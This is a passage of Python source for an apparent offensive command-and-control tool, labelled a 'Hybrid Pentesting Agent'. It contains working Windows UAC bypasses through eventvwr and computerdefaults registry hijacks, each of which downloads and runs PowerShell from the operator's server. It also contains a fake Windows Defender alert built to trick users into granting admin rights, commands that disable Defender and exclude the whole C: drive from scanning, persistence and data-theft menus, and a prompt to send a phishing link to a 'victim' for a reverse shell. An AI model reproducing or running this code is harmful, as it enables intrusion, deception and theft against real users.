            cmd = f'''$c="powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{CFG.http_port}/s')";New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process eventvwr.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force'''
            console.print("[cyan]Attempting eventvwr UAC bypass...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            # Wait for new elevated shell
            SHELL.wait_for_new_shell(timeout=15)
            input("\n[Enter to continue]")
        elif choice == "3":
            # computerdefaults.exe bypass
            ip = CFG.get_ip()
            port = CFG.listener_port
            cmd = f'''$c="powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{CFG.http_port}/s')";New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process computerdefaults.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force'''
            console.print("[cyan]Attempting computerdefaults UAC bypass...[/]")
            result = SHELL.execute(cmd)
            console.print(f"[green]{result}[/]")
            # Wait for new elevated shell
            SHELL.wait_for_new_shell(timeout=15)
            input("\n[Enter to continue]")
        elif choice == "4":
            # Create VBS that shows fake Defender dialog, then requests admin
            ip = CFG.get_ip()
            port = CFG.listener_port
            vbs_cmd = f'''$v=@"
Set objShell = CreateObject("WScript.Shell")
MsgBox "Windows Defender requires elevated permissions to complete a security scan." & vbCrLf & vbCrLf & "Click OK to authorize.", vbExclamation, "Windows Defender - Security Alert"
objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c IEX(New-Object Net.WebClient).DownloadString(''http://{ip}:{CFG.http_port}/s'')'", 0, False
"@;$v|Out-File "$env:TEMP\\defender.vbs" -Encoding ASCII;Start-Process wscript -ArgumentList "$env:TEMP\\defender.vbs"'''
            console.print("[cyan]Showing fake Defender dialog + UAC prompt...[/]")
            result = SHELL.execute(vbs_cmd)
            console.print(f"[green]{result}[/]")
            console.print("[yellow]User will see Defender dialog, then UAC prompt. If accepted, elevated shell connects![/]")
            # Wait for new elevated shell
            SHELL.wait_for_new_shell(timeout=30)
            input("\n[Enter to continue]")
        elif choice == "5":
            # Disable Defender (requires admin)
            console.print("[cyan]Attempting to disable Windows Defender...[/]")
            console.print("[yellow]⚠️ This REQUIRES admin privileges![/]")
            cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; echo "Defender disabled (if admin)!"'
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Disable Defender Result[/]"))
            input("\n[Enter to continue]")
        elif choice == "6":
            # Add exclusion path
            console.print("[cyan]Adding exclusion paths to Defender...[/]")
            console.print("[yellow]⚠️ This REQUIRES admin privileges![/]")
            cmd = 'Add-MpPreference -ExclusionPath "C:\\"; Add-MpPreference -ExclusionPath "$env:TEMP"; Add-MpPreference -ExclusionProcess "powershell.exe"; echo "Exclusions added (if admin)!"'
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Add Exclusion Result[/]"))
            input("\n[Enter to continue]")
        elif choice == "7":
            # Check Defender status
            console.print("[cyan]Checking Windows Defender status...[/]")
            cmd = 'Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, IoavProtectionEnabled, BehaviorMonitorEnabled, AntivirusEnabled | Format-List'
            result = SHELL.execute(cmd)
            console.print(Panel(result, title="[green]Defender Status[/]"))
            input("\n[Enter to continue]")

def raw_shell():
    """Interactive raw shell mode."""
    console.print("[bold cyan]RAW SHELL MODE[/]")
    console.print("[dim]Type 'exit' to return to menu[/]\n")
    
    while True:
        try:
            cmd = input("PS> ")
            if cmd.lower() == 'exit':
                break
            result = SHELL.execute(cmd)
            print(result)
        except KeyboardInterrupt:
            break

def post_exploitation_menu():
    """Main post-exploitation menu after shell connects."""
    while True:
        os.system('clear')
        
        # Check if shell is still connected
        status = "[bold green]✓ Connected[/]" if SHELL.connected else "[bold red]✗ Disconnected[/]"
        console.print(Panel(f"{status}\n[dim]Target: {SHELL.addr[0] if SHELL.addr else 'N/A'}[/]", 
                           title="🎯 ACTIVE SESSION", border_style="green" if SHELL.connected else "red"))
        
        choice = show_menu("What do you want to do?", [
            ("1", "🔐 Install Persistence"),
            ("2", "🔑 Steal Data"),
            ("3", "⬆️  Privilege Escalation"),
            ("4", "💻 Raw Shell (manual commands)"),
            ("5", "🔄 Wait for Reconnect"),
            ("0", "❌ Exit"),
        ])
        
        if choice == "0":
            if Prompt.ask("[bold]Really exit?[/]", choices=["y", "n"], default="n") == "y":
                break
        elif choice == "1":
            menu_persistence()
        elif choice == "2":
            menu_steal_data()
        elif choice == "3":
            menu_privesc()
        elif choice == "4":
            raw_shell()
        elif choice == "5":
            console.print("[cyan]Waiting for shell to reconnect (persistence will auto-connect)...[/]")
            SHELL.wait_for_new_shell(timeout=60)

# ============================================================================
# MAIN - Phase 1: Get Shell, Phase 2: Menu
# ============================================================================

def main():
    os.system('clear')
    
    banner = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║        🎯 HYBRID PENTESTING AGENT 🎯                          ║
    ║   ───────────────────────────────────────────────────         ║
    ║   Phase 1: Auto-serve link → Shell connects                   ║
    ║   Phase 2: Menu appears → You control everything              ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    console.print(banner, style="bold cyan")
    
    ip = CFG.get_ip()
    console.print(f"[bold]Your IP:[/] {ip}")
    console.print(f"[bold]Listener:[/] {CFG.listener_port}")
    console.print(f"[bold]HTTP:[/] {CFG.http_port}\n")
    
    # Phase 1: Start servers
    console.print("[cyan]Starting HTTP server...[/]")
    start_http_server()
    console.print(f"[green]✓ HTTP server on port {CFG.http_port}[/]")
    
    console.print("[cyan]Starting listener...[/]")
    SHELL.start_listener(CFG.listener_port)
    
    console.print(Panel(f"""
[bold yellow]Send this link to victim:[/]

[bold white]http://{ip}:{CFG.http_port}/[/]

Waiting for shell connection...
""", title="🎣 PHASE 1: GET SHELL", border_style="yellow"))
    
    # Wait for shell
    if SHELL.wait_for_connection(timeout=600):
        console.print("\n[bold green]🎉 SHELL OBTAINED![/]")
        console.print("[cyan]Entering post-exploitation menu...[/]\n")
        input("[Press Enter to continue]")
        
        # Phase 2: Post-exploitation menu
        post_exploitation_menu()
    else:
        console.print("[red]Timeout waiting for connection.[/]")
    
    SHELL.close()
    console.print("[yellow]Goodbye![/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted.[/]")
        SHELL.close()
